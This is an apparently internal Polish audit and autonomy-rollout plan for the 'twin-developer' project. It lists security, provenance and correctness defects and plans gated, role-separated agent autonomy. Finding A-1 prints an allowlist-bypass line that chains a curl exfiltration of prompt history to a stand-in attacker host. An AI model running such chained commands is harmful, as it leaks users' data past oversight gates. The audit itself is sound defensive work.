# Audyt wykonawczy i plan wdrożenia autonomii w Subactor

Data audytu: 2026-08-16. Rewizja: initial commit `6ba47a8`.
Zakres: cały `twin-developer` — runtime TypeScript, usługa Python, schematy, konfiguracja,
skrypty, dane wyjściowe i deklarowana adopcja standardów.

Dokument ma dwie części:

1. **Audyt** — co jest zepsute, niespójne albo nieuzasadnione, z dowodem i lokalizacją.
2. **Plan wdrożenia** — jak wpiąć ten projekt w istniejący łańcuch autonomii Subactor,
   tak aby przejmował pracę wykonywaną dziś ręcznie w rolach founder / developer / admin.

## Stan realizacji

Ustalenia audytu są zapisem stanu na rewizji `6ba47a8` i nie są modyfikowane
wstecz. Postęp śledzi ticket, nie ten dokument.

| Faza | Ticket | Stan |
|---|---|---|
| Faza 0 — naprawy blokujące | [`project/ticket-002`](../project/ticket-002/README.md) | **zamknięta** — A-1, A-2, A-3, B-1, B-3, B-4, C-1, C-2, C-4, C-5, D-1, D-4, D-5 |
| Faza 1 — konsumpcja kontraktów | — | otwarta |
| Faza 2 — wiązanie w profilu autonomii | — | otwarta |
| Faza 3 — pętla z niezależnym walidatorem | — | otwarta |
| Faza 4 — standing grant | — | otwarta |

Pozostałe pozycje P1 (A-4, A-5, A-6, A-7, B-2, B-5) świadomie zostały poza
Fazą 0; uzasadnienie w `project/ticket-002/README.md`.

---

## 0. Metoda i granice audytu

### Co faktycznie uruchomiono

| Bramka | Wynik |
|---|---|
| `make build` | PASS (`MODEL-REGISTRY-PASS`, `tsc` bez błędów) |
| `make demo --mode deterministic` | 161 events, 10 reguł, 0 kandydatów, 7 kroków |
| `make validate` | `SCHEMA-PASS` × 2, 10 reguł, 115 dowodów, 3 diagnostyki |
| `make test` | TypeScript 4/4, Python 3/3 |
| `make llm-fake-demo` | PASS, `llmUsed=true`, 1 kandydat z fixture |
| Powtarzalność | dwa przebiegi `demo` z `TWIN_NOW` → identyczne hashe wszystkich artefaktów |

Deklaracje README zgadzają się z obserwacją. Projekt **działa** i jest reprodukowalny.
Audyt dotyczy tego, czego te bramki nie sprawdzają.

### Czego audyt NIE sprawdził

Te obszary pozostają nieudowodnione i nie wolno ich raportować jako sprawne:

- **Ścieżka live LLM** — żaden prawdziwy provider nie został wywołany. Cała walidacja
  „przez REST" przechodzi przez `_fake_guidelines`, które **zwraca wejściowy baseline
  z doklejonym prefiksem** (`llm_service/core.py:144`). Zielony `make llm-fake-demo`
  nie dowodzi niczego o structured output, o odrzuceniu obcych `evidenceRefs`
  ani o zachowaniu modelu — dowodzi wyłącznie, że HTTP i pydantic działają.
- **Aider** — nie jest zależnością, nie był uruchomiony, `--dry-run` nie był obserwowany.
- **Skala** — korpus testowy to 161 zdarzeń. Zachowanie na pełnej historii
  (`data/raw/history-cursor.json` to 17 MB) nie było mierzone poza tym jednym przebiegiem.
- **Jakość reguł** — nie istnieje żaden zbiór etykietowany, więc precyzja i recall
  ekstrakcji są nieznane (patrz E-2).

---

## 1. Wykryte kwestie

Legenda statusu: **[Z]** = zweryfikowane wykonaniem, **[K]** = ustalone z kodu (bez egzekucji).
Legenda wagi: **P0** = blokuje jakąkolwiek autonomię, **P1** = blokuje zaufanie do artefaktu,
**P2** = dług techniczny.

---

### A. Granica efektów i bezpieczeństwo

#### A-1 [Z] [P0] Allowlista komend jest obejściem, nie bramką

`src/twin/validate.ts:94` dopuszcza komendę, gdy jest równa wpisowi allowlisty **albo
zaczyna się od wpisu ze spacją**. Nie ma żadnej walidacji reszty łańcucha.

Dowód (uruchomione na `dist/`):

```
commands: ["make test && curl -s http://attacker.example/exfil \
            --data-binary @data/raw/history-cursor.json"]
→ ALLOWLIST BYPASS: accepted
```

Odrzucane jest tylko `git diff; rm -rf /tmp/x` — i to przypadkiem, bo `;` nie ma
przed sobą spacji. Każdy `&&`, `||`, `|`, podstawienie `$(...)` i przekierowanie
przechodzi. To jedyna bramka stojąca między wygenerowanym przez LLM planem
a listą komend, którą operator ma wykonać. Dopóki to nie jest naprawione,
`autonomy.allowed: ["uruchamianie jawnie dozwolonych testów"]` jest fikcją.

**Naprawa:** allowlista musi porównywać **rozłożony wektor argv**, nie prefiks stringa.
Komenda przechodzi tylko wtedy, gdy po `shell-quote`-podobnym parsowaniu jest
dokładnie jednym poleceniem, jego argv[0] jest na liście, a łańcuch nie zawiera
żadnego operatora powłoki. Znak spoza białej listy = odrzucenie, nie ostrzeżenie.

#### A-2 [Z] [P0] Routing LLM jest fail-open, wbrew `.env.example` i wbrew polityce

`llm_service/core.py:45-55`: gdy zmienna z `enabledEnv` **nie jest ustawiona**,
`_route_enabled` zwraca `True`. `.env.example:24-26` deklaruje odwrotność
(`OPENROUTER_DIRECT_ENABLED=false`), ale nic w repozytorium nie ładuje `.env` —
ani Makefile, ani Python (brak `dotenv` w całym drzewie), a README każe operatorowi
zrobić `set -a; source .env` ręcznie.

Dowód:

```
unset env -> openrouter-direct enabled: True
with only OPENROUTER_API_KEY set (no ENABLED flags):
    provider=openrouter  model=openrouter/openrouter/auto
```

Konsekwencja: operator, który ma `OPENROUTER_API_KEY` w swoim `~/.bashrc`
(a to typowe) i uruchomi `make llm-api` bez `source .env`, **wysyła fragmenty
historii promptów do zewnętrznego dostawcy, sądząc, że trasa jest wyłączona**.
Polityka nazywa się `privacy-first-then-managed-fallback`; implementacja jest
`managed-by-default`.

Dodatkowo ta sama flaga ma dwie przeciwne semantyki w jednym repo:
`scripts/run-aider.sh:16` używa `truthy "${LOCAL_LLM_ENABLED:-false}"` (brak = wyłączone),
Python używa brak = włączone.

**Naprawa:** jedna funkcja rozstrzygania flag, domyślnie **wyłączone**, wspólna dla
Pythona i basha; jawne ładowanie `.env` w `Makefile` (`include`/`export`) albo
świadoma rezygnacja z `.env` i usunięcie `.env.example`. Do tego test, który
przy pustym środowisku żąda `LlmConfigurationError`, a nie trasy OpenRouter.

#### A-3 [K] [P0] Usługa REST nie ma uwierzytelnienia ani limitu

`llm_service/app.py` nie ma żadnej autoryzacji. `llm_service/cli.py:40` pozwala
podać dowolny `--host`, więc `serve --host 0.0.0.0` publikuje otwarte proxy
do płatnego modelu — bez klucza, bez limitu, bez śladu, kto pytał.
`/v1/chat/completions` przyjmuje dowolne wiadomości (`ChatRequest` ma
`extra="allow"`, `llm_service/models.py:46-47`), więc jest to również ścieżka
omijająca cały mechanizm dowodowy projektu.

**Naprawa:** wymagany nagłówek z sekretem serwisu (nie master key LiteLLM),
odmowa startu na adresie innym niż loopback bez jawnego `TWIN_ALLOW_REMOTE=1`,
oraz budżet żądań na proces.

#### A-4 [K] [P1] Redakcja sekretów istnieje tylko po stronie TypeScript

`docs/SECURITY.md` wymienia „lokalna redakcja przed wysłaniem" jako kontrolę,
a `config/source-policy.json` podnosi to do reguły epistemicznej
(„Sekrety są redagowane przed wysłaniem do LLM"). W rzeczywistości redaguje
wyłącznie `src/util/text.ts`, wywoływane w `createEvent`. Usługa Python przekazuje
`payload` do providera bez żadnej inspekcji (`core.py:166-189`), a `/v1/chat/completions`
nie redaguje niczego. Każdy inny konsument usługi — Aider, skrypt, drugi agent —
omija kontrolę całkowicie.

**Naprawa:** redakcja musi być w warstwie, przez którą **wszyscy** przechodzą,
czyli tuż przed `completion(...)` w `core.py`, a wersja TypeScript ma zostać
optymalizacją, nie jedynym miejscem egzekwowania.

#### A-5 [Z] [P1] `events.jsonl` zapisuje surowy, niezredagowany tekst

`createEvent` (`src/ingest/common.ts:22-33`) zwraca **oba** pola: `text` (surowy)
i `redactedText`. `writeEventsJsonl` (`src/cli.ts:79`) serializuje cały obiekt.
Znormalizowany log zdarzeń — artefakt commitowany do repozytorium — zawiera
więc pełną, niezredagowaną treść wszystkich promptów.

Zweryfikowano na bieżącym korpusie: 161 zdarzeń, wszystkie z polem `text`,
2 różnią się od `redactedText`. Sprawdziłem oba: to **fałszywe trafienia**
(zredagowano frazę `Authorization: Bearer <token>` z dokumentacji), więc
w tym zbiorze żaden prawdziwy sekret nie wyciekł. Mechanizm jest jednak
strukturalnie nieobecny — przy innej historii wyciek jest pewny, a artefakt
i tak trafia do gita.

**Naprawa:** `text` nie powinien opuszczać procesu ingestu. `PromptEvent`
w formie serializowanej ma zawierać wyłącznie `redactedText` i `contentHash`.

#### A-6 [K] [P1] Wzorce redakcji mają jednocześnie luki i nadgorliwość

`src/util/text.ts:1-7` obejmuje pięć wzorców. **Brakuje:** tokenów GitHub
(`ghp_`, `gho_`, `github_pat_`), kluczy AWS (`AKIA`), tokenów Slack (`xoxb-`),
JWT, bloków `-----BEGIN ... PRIVATE KEY-----`, connection stringów z hasłem.
**Nadmiar:** wzorzec `[A-Fa-f0-9]{40,64}` redaguje każdy SHA-1 i SHA-256, czyli
niszczy dokładnie te identyfikatory rewizji, na których opiera się cały ranking
`projectReality` („kod na znanej rewizji", „przypięta rewizja").

Test `tests/runtime.test.ts:75` sprawdza trzy wzorce, które akurat są zaimplementowane —
nie sprawdza żadnego z brakujących. To test tautologiczny.

**Naprawa:** rozszerzyć wzorce, wyłączyć heurystykę hex albo zawęzić ją tak, aby
nie łapała SHA (np. tylko przy poprzedzającym słowie-kluczu), i przepisać test
na tabelę przypadków, w tym **negatywnych** (SHA commita ma przetrwać).

#### A-7 [K] [P1] Publikacja surowej historii łamie własny ticket

`project/ticket-001/intent.json` wymienia w `forbiddenEffects`:
`"publishing raw prompt history"`. Repozytorium zostało utworzone
z `data/raw/history-cursor.json` (17 MB surowej historii Cursora) w initial commit.
Repo jest prywatne, więc szkoda jest ograniczona, ale **efekt zabroniony
przez własny ticket został wykonany** i nic tego nie zatrzymało — bo nie istnieje
żadna bramka czytająca `forbiddenEffects`.

**Naprawa:** to jest pierwszy realny test tezy projektu. `forbiddenEffects` musi być
egzekwowalny: pre-commit/pre-push, który czyta aktywny ticket i odmawia,
gdy staged pliki pasują do zabronionego efektu. Dopóki `forbiddenEffects`
to tekst do czytania przez człowieka, DSL jest dokumentacją, a nie polityką.

---

### B. Epistemika i proweniencja

#### B-1 [Z] [P0] Artefakt z fake providera jest nieodróżnialny od prawdziwego

To najpoważniejszy defekt względem tezy projektu.

`developer-twin.dsl.json` zapisuje `generator.llmUsed: true`, ale **nie zapisuje
providera ani modelu**. `guidelines.audit.json` (`src/cli.ts:187`) zapisuje
`effectiveMode: "llm"` — również bez providera. Jedyny rekord, który odróżnia
`provider: "fake"` od prawdziwego wywołania, to `data/output/llm-audit.jsonl`
po stronie Pythona — a ten plik jest **jawnie w `.gitignore`**.

Skutek zaobserwowany bezpośrednio: initial commit tego repozytorium zawierał
artefakty wyprodukowane przez `make llm-fake-demo` — `mode: require-llm`,
`llmUsed: true` i regułę `DT-LLM-101` pochodzącą z literału w `core.py:120-141`.
Nic w commitowanym stanie nie mówiło, że „LLM" był tablicą w kodzie źródłowym.
Baseline został w tym audycie przegenerowany deterministycznie.

Projekt, którego cała teza brzmi „claim agenta nie jest dowodem", produkuje
artefakt, w którym claim fixture'u jest nieodróżnialny od dowodu modelu.

**Naprawa:** `generator` musi nieść `provider`, `model`, `responseId` i `auditRef`
(hash rekordu audytu). Walidator ma **odrzucać** `llmUsed: true` bez tych pól.
Rekordy audytu z `provider: fake` mają być trwałe i commitowane albo mają
uniemożliwiać zapis artefaktu do `data/output/`.

#### B-2 [K] [P1] `confidence` nie ma podstawy pomiarowej

`confidence` powstaje jako `baseConfidence` (liczba wpisana ręcznie
w `config/rule-catalog.json`) plus drobne premie za korektę i powtórzenia
(`src/extract/deterministic.ts:95-100`). `matchAny` to dopasowanie podłańcucha
na tokenach tak ogólnych jak `"docker"`, `"dsl"`, `"llm"`, `"restart"`, `"offer"`,
`"home:"`. `DT-LLM-001` aktywuje się przy `minSupport: 1` na słowie `"llm"`
i dostaje `confidence` 0.88+.

Liczba wygląda na miarę, a jest przepisaną stałą. `docs/DSL.md` mówi, że opisuje
„siłę ekstrakcji intencji" — nic tego nie mierzy. `docs/NEXT_STEPS.md` sam to
przyznaje w P2 (brak zbioru etykietowanego).

Dopóki to trwa, żadna bramka nie może sensownie brzmieć „przepuść przy
confidence ≥ X", bo X nie odnosi się do niczego obserwowalnego.

**Naprawa:** albo zbudować zbiór etykietowany z P2 i skalibrować, albo
przemianować pole na `catalogPriority` i przestać sugerować, że to prawdopodobieństwo.
Druga opcja jest tania i natychmiast uczciwa.

#### B-3 [K] [P1] Brak bramki reprodukowalności artefaktów

`scripts/render-litellm-config.py --check` udowadnia, że `config/litellm-proxy.yaml`
jest aktualną fasadą `model-registry.json` — i `make build` to egzekwuje. Świetny wzorzec.
Ten sam wzorzec **nie istnieje** dla `data/output/*` ani `data/normalized/*`.
Nic nie sprawdza, że commitowane artefakty odpowiadają obecnym wejściom i kodowi.
Ktoś może ręcznie edytować `developer-twin.dsl.json` i wszystkie bramki będą zielone.

Dodatkowo bez `TWIN_NOW` pole `generatedAt` zmienia się przy każdym przebiegu,
więc naiwny `git diff` zawsze pokazuje zmianę i uczy ignorowania szumu.

**Naprawa:** `make verify-artifacts` — regeneracja do katalogu tymczasowego
z przypiętym `TWIN_NOW` i porównanie hashy. Wpiąć do `make validate`.

#### B-4 [Z] [P2] `$schema` w DSL wskazuje nieistniejącą ścieżkę

`src/twin/aggregate.ts:156` wpisuje `"$schema": "../schemas/developer-twin.schema.json"`.
Artefakt leży w `data/output/`, więc ścieżka rozwiązuje się do `data/schemas/`, którego nie ma.
Walidacja przechodzi tylko dlatego, że `scripts/validate-schema.py` ładuje schemat
z własnej stałej `ROOT`, całkowicie ignorując pole. Każdy zewnętrzny walidator
(IDE, `ajv`, edytor) zgłosi błąd.

**Naprawa:** `../../schemas/developer-twin.schema.json` albo `$id` z URI.

#### B-5 [K] [P1] Fallback wyboru reguł cicho zmyśla kontekst

`src/twin/guidelines.ts:24`: gdy żadna reguła nie pasuje do treści zadania,
runtime bierze **cztery reguły o najwyższym confidence**. Nie jest to nigdzie
zaznaczone w wyniku — brak diagnostyki, brak wpisu w `unknowns`. Plan dla zadania,
o którym bliźniak nie wie nic, wygląda identycznie jak plan oparty na dowodach.

To jest dokładnie ten tryb porażki, który README obiecuje eliminować
(„LLM może wybrać najbardziej przekonujące zdanie zamiast aktualnej intencji").

**Naprawa:** brak dopasowania = diagnostyka `review_required` + jawny wpis
w `unknowns`, a w trybie autonomicznym fail-closed.

#### B-6 [K] [P2] Plan gubi wszystkie MUST poza pierwszym

`src/twin/guidelines.ts:47`: `action: rule.must[0] ?? rule.title`. Reguła z trzema
zobowiązaniami trafia do planu jako jedno. Pozostałe docierają do Aidera
(`src/aider/prompt.ts:25`), ale nie do `guidelines.json`, który jest artefaktem
audytowym i wejściem bramki. Plan i kontekst wykonawczy niosą różną politykę.

---

### C. Poprawność i skala

#### C-1 [Z] [P1] Ingest wysypuje się na dużych historiach

`src/ingest/index.ts:27` liczy kolejny numer sekwencji przez
`Math.max(...events.map(...))` na **całej** dotychczasowej tablicy, po każdym pliku.

Zmierzone: `Math.max(...)` przechodzi dla 100 000 elementów i rzuca
`RangeError: Maximum call stack size exceeded` przy 200 000.

README zachęca do podawania `--input /path/to/.zsh_history` obok eksportów IDE.
Realna wieloletnia historia powłoki plus eksport Cursora przekracza ten próg.
Do tego konstrukcja jest O(n²) po plikach.

**Naprawa:** trzymać licznik w zmiennej (`sequence += chunk.length`), zero spreadu.

#### C-2 [K] [P2] Adapter JSONL produkuje kolidujące sekwencje

`src/ingest/jsonl.ts:16`: `sequence: parsed.sequence ?? sequence++`. Gdy rekord ma
własną sekwencję, licznik lokalny **się nie zwiększa**, więc kolejne rekordy bez
sekwencji dostają numery już użyte. Sortowanie po `sequence` staje się niestabilne,
a `sequence` jest częścią rankingu supersession.

#### C-3 [K] [P2] Wyszukiwania liniowe w pętlach

- `src/extract/deterministic.ts:99` — materializuje `[...evidenceByEvent.values()]`
  i robi `.find()` **wewnątrz `reduce` wewnątrz pętli po regułach**.
- `src/twin/validate.ts:46` — `twin.evidenceCatalog.find()` wewnątrz `.every()`
  wewnątrz pętli po regułach.
- `src/extract/deterministic.ts:24` — `normalizeForMatch` liczone od nowa
  dla każdej pary (zdarzenie, wpis katalogu).

Przy 161 zdarzeniach nieistotne. Przy korpusie, do którego projekt aspiruje —
kwadratowe. Wszystkie trzy to zamiana na `Map` zbudowaną raz.

#### C-4 [K] [P1] Healthcheck LLM może wisieć bez końca

`src/llm/client.ts:44` — `serviceHealth` używa gołego `fetch` bez `AbortController`,
podczas gdy `postJson` ma limit 90 s. W trybie `prefer-llm` `buildArtifacts`
najpierw woła `serviceHealth`; serwer, który przyjmuje połączenie i milczy,
zawiesza cały przebieg bez timeoutu i bez diagnostyki. W pętli autonomicznej
to cichy zakleszczenie zamiast degradacji.

#### C-5 [K] [P1] Ciche obcięcie kontekstu dla LLM

`src/llm/client.ts:59` — `.slice(-160)`. Liczba jest wpisana na sztywno,
nieudokumentowana i nie zostawia śladu. Przy większej historii ekstrakcja
intencji widzi ostatnie 160 wypowiedzi człowieka i nikt się o tym nie dowie.
Przy `require-llm` daje to fałszywe poczucie kompletności.

**Naprawa:** parametr konfiguracyjny + diagnostyka `DT_LLM_INPUT_TRUNCATED`
z liczbą pominiętych zdarzeń.

#### C-6 [K] [P2] Pułapka identyfikatorów kandydatów

`src/twin/aggregate.ts:43` numeruje od 101 z `padStart(3)`, a walidator
(`src/twin/validate.ts:32`) wymaga dokładnie trzech cyfr. Powyżej 899 kandydatów
w jednym przebiegu ID ma cztery cyfry i cała walidacja pada jako `blocking`.

---

### D. Kontrakty i konfiguracja

#### D-1 [K] [P1] Połowa artefaktów i cała konfiguracja są poza schematami

`scripts/validate-schema.py:25-26` waliduje dwa dokumenty. Bez schematu pozostają:
`events.jsonl`, `source-manifest.json`, `extraction-map.json`, `offer-reality.json`,
`guidelines.audit.json`, `llm-audit.jsonl`, a także **cała konfiguracja**:
`rule-catalog.json`, `source-policy.json`, `llm-routing.json`, `model-registry.json`,
`data/context/project.json`, `project/ticket-*/intent.json`.

Literówka w `rule-catalog.json` nie powoduje błędu — powoduje **cichy brak reguły**,
a więc cichą zmianę polityki wykonawczej. To najgroźniejszy rodzaj awarii w tym projekcie.

**Naprawa:** schemat na każdy plik konfiguracji, walidacja przy starcie, nie przy commicie.

#### D-2 [K] [P2] Wersja generatora zduplikowana

`src/twin/aggregate.ts:15` — `const VERSION = '0.1.0'` obok `package.json:version`.
Dwa źródła jednej prawdy, w projekcie, którego reguła `DT-SSOT-001` tego zabrania.

#### D-3 [K] [P2] Ręczne deklaracje Node zamiast `@types/node`

`tsconfig.json` ma `"types": []`, a `src/node-shims.d.ts` to 45 linii ręcznie
pisanych deklaracji `Buffer`, `process`, `node:fs/promises`, `node:path`, `node:crypto`,
`node:test`. Do tego `lib` zawiera `DOM`, żeby `fetch`/`AbortController`/`setTimeout`
się typowały — czyli program Node jest typowany kontraktem przeglądarki
(np. `setTimeout` zwraca `number`, a nie `Timeout`).

Kompiluje się, ale typy są ręcznie utrzymywaną fikcją, która może rozejść się
z zachowaniem runtime bez żadnego sygnału. `noUncheckedIndexedAccess: false`
dodatkowo wyłącza kontrolę dostępu do indeksów, na której polega kilkanaście
miejsc typu `match[1]`.

#### D-4 [K] [P2] Ścieżka audytu Pythona zależy od katalogu roboczego

`llm_service/audit.py:11` używa ścieżki względnej `data/output/llm-audit.jsonl`,
podczas gdy każdy inny odczyt w `core.py` idzie przez `_root()`. Uruchomienie usługi
z innego katalogu rozsypuje audyt po systemie plików. Dla ledgera append-only
to defekt, nie niedogodność.

#### D-5 [K] [P2] Audyt zapisuje wyłącznie sukcesy

`append_audit` jest wołane tylko po udanym wywołaniu (`core.py:221, 237, 259`).
Odrzucenia schematu, timeouty, błędy providera i konfiguracji nie zostawiają śladu.
Ledger, który rejestruje tylko to, co się udało, nie nadaje się do wykrywania
degradacji ani do rozliczania kosztu.

#### D-6 [K] [P2] Funkcje biblioteczne czytają `process.argv`

`src/cli.ts:177` i `:215` — `buildGuidelineArtifacts` i `buildAiderArtifacts`
wołają `flag('--task', ...)` w środku, zamiast przyjąć argument. Funkcje
eksportowane jako API są nietestowalne bez podmiany `argv` i niereentrantne.
W usłudze długodziałającej (a tam to zmierza) to bug czekający na wywołanie.

---

### E. Powielenie względem ekosystemu Subactor

To jest najważniejsza część audytu dla decyzji o wdrożeniu.

#### E-1 [Z] [P0] Projekt buduje czwartą równoległą definicję dowodu i receiptu

W organizacji już istnieją:

| Co | Gdzie | Status |
|---|---|---|
| Kontrakt twina: commands, events, **observations, evidence, receipts**, transporty | `subactor/twin` (protobuf, language-neutral) | istnieje |
| Narzędzia pomiarowe emitujące **jeden** kontrakt czytany przez twina i todo2code | `subactor/twin-probes` | istnieje, ma zapisane przebiegi |
| Ekstrakcja intencji i runtime z kodu | `semcod/todo2code` (`t2c`, zainstalowany globalnie) | istnieje |
| Normatywny model autonomii: standing grant, rozdział ról, bramki merge | `wellmanifest/autonomy` v0.8.1 | istnieje, ma walidator |
| Graf etapów lifecycle twina | `wellmanifest/twin-lifecycle` | istnieje |

`twin-developer` definiuje **własny** `EvidenceRecord`, **własny** ledger audytu,
**własny** blok `autonomy` (zaszyty jako literał w `src/twin/aggregate.ts:181-186`)
i planuje w `docs/NEXT_STEPS.md` P0 **własne** adaptery Git / AST / TestQL / runtime —
czyli dokładnie to, co `subactor/twin-probes` już robi jako „join" formatów.

Dopóki to trwa, projekt nie jest komponentem Subactora — jest jego konkurencyjną
kopią w miniaturze, a każdy dowód, który wyprodukuje, wymaga tłumaczenia.

**Naprawa:** patrz Faza 1 planu — konsumować kontrakty, nie definiować nowe.

#### E-0 [Z] [P0] Lokalny schemat podszywał się pod kontrakt standardu

Wykryte 2026-08-16, po zamknięciu ticket-002. Nie jest to defekt zastany —
powstał w trakcie naprawy D-1 i został naprawiony w ticket-003.

`schemas/ticket-intent.schema.json` deklarował
`$id: https://example.invalid/schemas/new-project.intent/v3` oraz
`"schema": { "const": "new-project.intent/v3" }` i był wpięty w `make validate`.
Bramka drukowała `SCHEMA-PASS project/ticket-002/intent.json`.

Prawdziwy kontrakt to `governance/intent.schema.json` w `wellmanifest/new-project`.
Zwalidowane wobec niego, oba intenty odpadają identycznie:

```
project/ticket-001/intent.json  → 10 błędów
project/ticket-002/intent.json  → 10 błędów
  brak: ticket, summary, forbiddenPaths, stacks, dependsOn,
        conflictsWith, integrationTicket, classification
  nadmiar: purpose, status, forbiddenEffects, dependencies, evidencePolicy
```

`ticket-001` deklarował `new-project.intent/v3` od początku istnienia projektu,
nigdy go nie spełniając; `ticket-002` powielił ten kształt, a nowy walidator
nadał niezgodności pozór dowodu. To jest dokładnie ten tryb porażki, który cały
ten projekt opisuje jako główne zagrożenie: **zielona bramka postawiona zamiast
dowodu**.

**Naprawa (ticket-003):** schemat przemianowany na
`schemas/local-ticket-intent.schema.json` z własną przestrzenią nazw
`subactor.twin-developer.ticket-intent/v1`, oba intenty przestały deklarować
cudzy kontrakt, a `scripts/check-schema-identity.py` odrzuca każdy `$id`
i `const` należący do obcego właściciela. Bramka zweryfikowana przez ponowne
wstawienie podrobionego `$id` — `SCHEMA-IDENTITY-FAIL`, exit 1.

Zgodność z `new-project.intent/v3` wolno zadeklarować dopiero wtedy, gdy
potwierdzi ją walidator standardu, czyli po adopcji (Faza 1).

#### E-2 [Z] [P0] Adopcja standardów jest zadeklarowana, nie zweryfikowana

`data/context/project.json` deklaruje `adopts: [wellmanifest/new-project,
ticket-lifecycle, modularity, ssot, project-ssot, policy-dsl]`. Wszystkie sześć
standardów istnieje lokalnie w `~/github/wellmanifest/`. **Żadna bramka
w `twin-developer` ich nie sprawdza.** `make validate` waliduje dwa własne artefakty
i nic więcej. Deklaracja adopcji jest napisem.

To ten sam wzorzec co A-7: kontrakt istnieje, wiązania brak.

**Naprawa:** wpiąć konformansowe CLI standardów do `make validate`
(np. `wellmanifest/autonomy/src/autonomy_check.py`) i traktować niepowodzenie
jako blokujące.

#### E-3 [Z] [P0] Brak wiązania w profilu autonomii

`wellmanifest/autonomy/profiles/subactor-semcod.profile.json` v6 wiąże etapy
z produktami. Pełny graf:

```
dispatch  → autonom                                   (dispatcher, protected-dispatch)
observe   → autonom, deployment, doctor-agent,
            platform, twin-probes, www-sub-actor      (observer, read-only)
evidence  → semcod/todo2code, wellmanifest/code-dsl   (observer, read-only)
plan      → planfile, orchestrator, skills-agent,
            todo2code                                 (planner, propose-only)
implement → repair-agent, autonom, onedev-agent,
            koru, repatch                             (implementer, candidate-write)
validate  → validator-agent, autonomy-lab,
            onedev-agent, vallm, redup, prefact,
            docval, regres, testless                  (validator, validate-only)
publish   → autonom, onedev-agent, goal               (publisher, protected-publish)
audit     → skills-agent                              (auditor, append-only-audit)
```

`twin-developer` **nie występuje** ani w `ownership.runtimeOwners`, ani w żadnym
`bindings[]`. Jest zatem — z punktu widzenia standardu autonomii Subactora —
narzędziem nieistniejącym. Może produkować dowolnie dobre artefakty; żaden etap
nie ma obowiązku ich przeczytać.

To jest **jedyna rzecz, która stoi między obecnym stanem a wdrożeniem**. Reszta
audytu to warunki, żeby to wiązanie było uczciwe.

---

## 2. Podsumowanie priorytetów

| ID | Kwestia | Waga |
|---|---|---|
| A-1 | Allowlista komend do obejścia jednym `&&` | P0 |
| A-2 | Routing fail-open wysyła dane do OpenRoutera wbrew konfiguracji | P0 |
| A-3 | REST bez uwierzytelnienia | P0 |
| B-1 | Artefakt z fixture nieodróżnialny od artefaktu z modelu | P0 |
| E-1 | Własne kontrakty zamiast `subactor/twin` i `twin-probes` | P0 |
| E-2 | Adopcja standardów niezweryfikowana | P0 |
| E-3 | Brak wiązania w profilu autonomii | P0 |
| A-4 | Redakcja tylko w TS, usługa Python jej nie ma | P1 |
| A-5 | Surowy tekst promptów w commitowanym `events.jsonl` | P1 |
| A-6 | Luki i nadgorliwość wzorców redakcji | P1 |
| A-7 | `forbiddenEffects` bez egzekucji (złamane w tym repo) | P1 |
| B-2 | `confidence` bez podstawy pomiarowej | P1 |
| B-3 | Brak bramki reprodukowalności artefaktów | P1 |
| B-5 | Cichy fallback do czterech reguł | P1 |
| C-1 | `RangeError` przy ~200 tys. zdarzeń | P1 |
| C-4 | Healthcheck bez timeoutu | P1 |
| C-5 | Ciche obcięcie do 160 zdarzeń | P1 |
| D-1 | Konfiguracja i połowa artefaktów bez schematów | P1 |
| B-4, B-6, C-2, C-3, C-6, D-2…D-6 | dług techniczny | P2 |

---

## 3. Plan wdrożenia w Subactor

### 3.1 Zasada nadrzędna

Celem nie jest „bliźniak, który sam programuje". Celem jest **zdjęcie z człowieka
powtarzalnych decyzji wykonawczych, przy zachowaniu rozdziału ról wymaganego
przez `wellmanifest/autonomy`**: agent implementujący nie może walidować
ani zatwierdzać własnej zmiany, a grant nie może rozszerzyć sam siebie.

`twin-developer` jest z natury narzędziem etapów **`evidence` i `plan`**, w trybie
`observer/read-only` i `planner/propose-only`. Nie wolno go wiązać z `implement`
ani `publish` — jego własny DSL już to mówi (`autonomy.approvalRequired`),
i akurat w tym ma rację.

### 3.2 Mapa ról: co przestaje robić człowiek

| Dzisiejsza czynność człowieka | Etap | Kto przejmuje | Czym się rozlicza |
|---|---|---|---|
| „przeczytaj poprzednie tickety i przypomnij sobie, jak to robimy" | evidence | `twin-developer` + `todo2code` | DSL z `evidenceRefs` do przypiętych rewizji |
| „napisz, jakie są zasady w tym repo" | evidence | `twin-developer` | reguły `active` z cytowaniem |
| „ustal, co jest do zrobienia i w jakiej kolejności" | plan | `orchestrator` + `planfile`, ograniczone przez DSL | `guidelines.json` z `ruleRefs` |
| „przygotuj kontekst dla agenta kodującego" | plan | `twin-developer` | `aider-message.md` + allowlista argv |
| „zrób zmianę" | implement | `repair-agent` / `onedev-agent` | diff + hash patcha przed apply |
| „sprawdź, czy nie zepsute" | validate | `validator-agent`, `testless`, `regres`, `prefact` | receipty z exit code i rewizją |
| „zmerguj i wypuść" | publish | `autonom` / `goal` | protected-publish, PR |
| „zapisz, co się stało" | audit | `skills-agent` | ledger append-only |

**Co zostaje przy człowieku i nie podlega automatyzacji:**
wydanie i odnowienie standing grantu, budżet ryzyka i kosztu, rotacja sekretów,
decyzje produktowe i prawne, oraz każda praca oznaczona jako niejednoznaczna,
destrukcyjna lub wykraczająca poza grant — standard wymaga tu fail-closed.

### 3.3 Fazy

Każda faza ma **warunek wyjścia w postaci artefaktu**, nie w postaci opinii.
Faza się nie domyka, dopóki artefakt nie istnieje i nie jest zielony.

---

#### Faza 0 — Naprawy blokujące (przed jakimkolwiek grantem)

Zakres: A-1, A-2, A-3, B-1, plus B-3 i D-1 jako fundament pod resztę.

Bez tego nie ma sensu iść dalej: allowlista, która przepuszcza `&&`, i routing,
który wysyła dane wbrew konfiguracji, unieważniają każdą gwarancję zbudowaną wyżej.

**Warunek wyjścia:**
- test regresyjny, w którym `make test && curl ...` jest **odrzucone**, w zestawie
  co najmniej 12 wektorów (`&&`, `||`, `;`, `|`, `$(...)`, backtick, `>`, `<`, `\n`);
- test, w którym puste środowisko daje `LlmConfigurationError`, nie trasę OpenRouter;
- `developer-twin.dsl.json` z `llmUsed: true` i bez `generator.provider`
  jest odrzucany jako `blocking`;
- `make verify-artifacts` w `make validate`;
- schemat dla każdego pliku w `config/` i `data/context/`.

---

#### Stan wyjściowy Fazy 1: co pokazała ankieta wellmanifest

Przed rozpoczęciem Fazy 1 przebadano wszystkie 34 repozytoria standardów
w `wellmanifest/`, żeby ustalić, czy problem adopcji jest systemowy, czy lokalny.
**Jest lokalny.**

| Miara | Wynik |
|---|---|
| Intenty ticketów zgodne z `governance/intent.schema.json` | **190 / 193** |
| Repozytoria adoptowane przechodzące własną bramkę | **24 / 24 `GOV-PASS`** |
| Repozytoria z wewnętrzną niespójnością (pinowany schemat vs manifest) | **0** |
